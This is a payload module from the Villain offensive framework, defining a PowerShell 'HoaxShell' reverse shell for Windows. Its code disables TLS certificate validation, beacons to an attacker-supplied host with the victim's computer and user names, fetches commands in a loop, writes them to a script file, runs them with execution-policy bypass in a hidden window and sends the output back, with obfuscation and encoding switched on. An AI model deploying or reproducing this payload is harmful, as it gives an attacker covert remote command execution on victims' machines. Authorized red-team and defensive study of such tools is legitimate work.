# This module is part of the Villain framework

class Payload:

    info = {
        'Title' : 'Windows PowerShell outfile HoaxShell https - Constraint Language Mode',
        'Author' : 'Panagiotis Chartas (t3l3machus)',
        'Description' : 'An Https based beacon-like reverse shell that writes and executes commands from disc and will work even if Constraint Language Mode is enabled on the victim',
        'References' : ['https://github.com/t3l3machus/hoaxshell', 'https://revshells.com']
    }

    meta = {
        'handler' : 'hoaxshell',
        'type' : 'ps-outfile-cm-ssl',
        'os' : 'windows',
        'shell' : 'powershell.exe'
    }

    config = {
        'frequency' : 0.8,
        'outfile' : "C:\\Users\\$env:USERNAME\\.local\\haxor.ps1"
    }

    parameters = {
        'lhost' : None
    }

    attrs = {
        'obfuscate' : True,
        'encode' : True
    }

    data = '''Start-Process $PSHOME\powershell.exe -ArgumentList {add-type @"
using System.Net;using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(
ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
$ConfirmPreference="None";$s=\'*LHOST+*\';$i=\'*SESSIONID*\';$p=\'https://\';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/*VERIFY*/$env:COMPUTERNAME/$env:USERNAME -Headers @{"*HOAXID*"=$i};for (;;){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/*GETCMD* -Headers @{"*HOAXID*"=$i});if (!(@(\'None\',\'quit\') -contains $c)) {echo "$c" | out-file -filepath *OUTFILE*;$r=powershell -ep bypass *OUTFILE* -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$x=Invoke-RestMethod -Uri $p$s/*POSTRES* -Method POST -Headers @{"*HOAXID*"=$i} -Body ($e+$r)} elseif ($c -eq \'quit\') {del *OUTFILE*;Stop-Process $PID} sleep *FREQ*}} -WindowStyle Hidden'''
